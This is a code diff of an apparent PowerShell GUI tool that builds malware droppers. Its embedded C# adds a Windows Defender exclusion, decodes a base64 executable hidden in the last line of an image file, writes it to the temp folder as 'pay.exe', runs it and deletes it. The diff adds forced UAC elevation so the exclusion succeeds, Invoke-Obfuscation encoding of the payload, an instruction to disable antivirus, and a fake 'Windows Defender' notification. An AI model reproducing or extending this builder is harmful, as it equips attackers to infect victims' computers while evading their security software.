@@ -18,24 +18,68 @@ public class Dropped
 {
     public static void Main()
     {
-        string path_current = Directory.GetCurrentDirectory();
+        string path = Path.GetTempPath();
         Process pstest = new Process();
         pstest.StartInfo.FileName = "powershell.exe";
-        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath '" + path_current + "'";
+        pstest.StartInfo.Arguments = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '" + path + "'";
         pstest.Start();
-        string path = Path.GetTempPath();
         string path2 = Directory.GetCurrentDirectory();
         string image = path2 + "\\test_image.jpg";
         var last_line = File.ReadLines(image).Last().ToString();
         var base64_decode = Convert.FromBase64String(last_line);
-        File.WriteAllBytes(path + "text.exe", base64_decode);
+        File.WriteAllBytes(path + "pay.exe", base64_decode);
         Process ps = new Process();
-        ps.StartInfo.FileName = path + "text.exe";
+        ps.StartInfo.FileName = path + "pay.exe";
         ps.Start();
-        File.Delete(path + "test.exe");
+        File.Delete(path + "pay.exe");
     }
 }
 "@
+Add-Type -TypeDefinition $CSHARP -Language CSharp
+[Dropped]::Main()
+'@
+
+$EMBEDDED_CODE_ADMIN = @'
+$mypath = $MyInvocation.MyCommand.Path
+$MAIN_PATH = Split-Path $mypath
+$MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
+
+try {
+    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+} catch {
+    Write-Host "nah"
+}
+
+$CSHARP = @"
+using System.IO;
+using System.Linq;
+using System.Diagnostics;
+using System;
+public class Dropped
+{
+    public static void Main()
+    {
+        string path = Path.GetTempPath();
+        Process pstest = new Process();
+        pstest.StartInfo.FileName = "powershell.exe";
+        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
+        pstest.Start();
+        string path2 = Directory.GetCurrentDirectory();
+        string image = "REPLACE" + "\\fud.png";
+        var last_line = File.ReadLines(image).Last().ToString();
+        var base64_decode = Convert.FromBase64String(last_line);
+        File.WriteAllBytes(path + "pay.exe", base64_decode);
+        Process ps = new Process();
+        ps.StartInfo.FileName = path + "pay.exe";
+        ps.Start();
+        File.Delete(path + "pay.exe");
+    }
+}
+"@
+
+$CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
+
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 Add-Type -TypeDefinition $CSHARP -Language CSharp
 [Dropped]::Main()
 '@
@@ -142,16 +186,19 @@ function Invoke-PowershellOBF {
     )
     $OBFUSCATOR_URL = "https://github.com/danielbohannon/Invoke-Obfuscation/archive/refs/heads/master.zip"
     $OBFUSCATOR_PATH = "$working_dir\Invoke-Obfuscation.zip"
-    $OBFUSCATOR_EXTRACT_PATH = "$working_dir\Invoke-Obfuscation"
+    $OBFUSCATOR_EXTRACT_PATH = "$working_dir"
     Start-BitsTransfer -Source $OBFUSCATOR_URL -Destination $OBFUSCATOR_PATH
     Expand-Archive -Path $OBFUSCATOR_PATH -DestinationPath $OBFUSCATOR_EXTRACT_PATH
-    $command = "cd Invoke-Obfuscation ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy'"
-    Invoke-Command -ScriptBlock { $command }
-    $clipboard_output = Get-Clipboard
-    $clipboard_output | Out-File -FilePath $file_location
-    Remove-Item -Path $OBFUSCATOR_PATH
-    Get-ChildItem $OBFUSCATOR_EXTRACT_PATH -Recurse | Remove-Item -Force
-    Remove-Item -Path $OBFUSCATOR_EXTRACT_PATH
+    $command = "cd Invoke-Obfuscation-master ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy, Exit'"
+    $var_OUTPUT_BOX.Text += "IF OBFUSCATION FALLS TURN OFF ANTIVIRUS (nobody likes antivirus)"
+    Start-Process -FilePath "powershell.exe" -ArgumentList $command -Wait
+    $var_OUTPUT_BOX.Text += "OBFUSCATION COMPLETE"
+    $var_OUTPUT_BOX.Text += "COPYING TO CLIPBOARD"
+    $final = Get-Clipboard
+    $final | Out-File -FilePath $file_location
+    Remove-Item -Path "$OBFUSCATOR_PATH" -Force
+    Remove-Item -Path "$OBFUSCATOR_EXTRACT_PATH/Invoke-Obfuscation-master" -Force -Recurse
+    Remove-Item -Path "$OBFUSCATOR_EXTRACT_PATH/Invoke-Obfuscation-master" -Force -ErrorAction SilentlyContinue
 }
 
 function Invoke-obfuscate {
@@ -251,7 +298,7 @@ function build {
             $line = Invoke-obfuscate $line
             Add-Content -Path .\output\payload.bat -Value $line
         }
-        $str_obf = "powershell -ExecutionPolicy Bypass -File payload.ps1 && del payload.ps1 && del payload.bat"
+        $str_obf = "powershell -ExecutionPolicy Bypass -File payload.ps1 && del payload.ps1"
         $str_obf = Invoke-obfuscate $str_obf
         $var_OUTPUT_BOX.Text += "Writing obfuscated batch code to file...`n"
         Add-Content -Path .\output\payload.bat -Value $str_obf
@@ -264,7 +311,7 @@ function build {
     }
     #set color to green in text box
     $var_OUTPUT_BOX.Text += "`nDone!`n"
-    Show-Notification "Done!" "Payload created in $working_dir\output"
+    Show-Notification "Windows Defender" "Payload created in $working_dir\output lmao u prolly thought this was a virus warning (skull emoji)"
 }
 
 $image_name = "comethazine.png"
@@ -337,17 +384,12 @@ $var_OUTPUT_BOX.add_TextChanged({
     $var_OUTPUT_BOX.ScrollToEnd()
 })
 
-$var_OBFUSCATE_TF.add_click({
-    $current_text = $var_OBF_TEXT_TF.Text
-    if ($current_text -eq 'True') {
-        $var_OBF_TEXT_TF.Text = 'False'
-    }
-    else {
-        $var_OBF_TEXT_TF.Text = 'True'
-    }
-})
-
 $var_OUTPUT_BOX.Text += "Successfully Started`n"
 Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
 Hide-Console #Makes it look nice
+#If you don't want UAC admin to be required when running the payload set this to $false
+$uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
+if ($uac_required -eq $True) {
+    $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN
+}
 $Null = $window.ShowDialog()
